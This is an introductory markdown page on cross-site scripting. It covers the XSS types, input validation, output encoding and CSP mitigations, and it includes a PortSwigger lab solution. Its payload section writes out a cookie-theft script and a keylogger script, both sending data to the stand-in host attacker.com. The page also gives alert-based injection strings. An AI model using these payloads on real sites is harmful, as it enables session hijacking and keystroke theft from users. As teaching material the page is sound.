# Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a type of security vulnerability typically found in web applications. XSS attacks occur when an attacker can inject malicious scripts into web pages viewed by other users. These scripts can hijack user sessions, deface websites, or redirect users to malicious sites.

## Types of XSS
1. **Stored XSS**: The malicious script is permanently stored on the target server, such as in a database, and is served to users when they request the stored information.
2. **Reflected XSS**: The malicious script is reflected off a web server, such as in an error message or search result, and is sent to the user's browser immediately.
3. **DOM-based XSS**: The vulnerability is within the client-side code rather than the server-side, allowing manipulation of the DOM environment in the victim's browser.

## Basic Theory
XSS vulnerabilities arise due to improper validation or escaping of user input. To prevent XSS:
- **Input Validation**: Validate and sanitize all user inputs.
- **Output Encoding**: Encode data before rendering it on the page.
- **Content Security Policy (CSP)**: Implement CSP to restrict sources of executable scripts.

## Popular Payload Examples
1. **Basic Alert**
    ```html
    <script>alert('XSS');</script>
    ```

2. **Cookie Theft**
    ```html
    <script>
      var img = new Image();
      img.src = "http://attacker.com/steal?cookie=" + document.cookie;
    </script>
    ```

3. **Keylogger**
    ```html
    <script>
      document.onkeypress = function(e) {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "http://attacker.com/log?key=" + e.key, true);
        xhr.send();
      };
    </script>
    ```

## Mitigation Techniques
- **Escape Untrusted Data**: Ensure that any untrusted data is properly escaped before it is rendered in the browser.
- **Use Secure APIs**: Prefer secure APIs that automatically escape data.
- **HTTPOnly Cookies**: Use HTTPOnly flag for cookies to prevent access via JavaScript.

Regularly audit your code, stay updated with the latest security practices, and educate your team about common vulnerabilities and their prevention.

## Resources
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN Web Docs on XSS](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)

## Lab Examples
[Lab: Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)

This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

To solve the lab, perform a cross-site scripting attack that calls the alert function. 

**Solution:**
```
"><script>alert('hacked');</script>
```
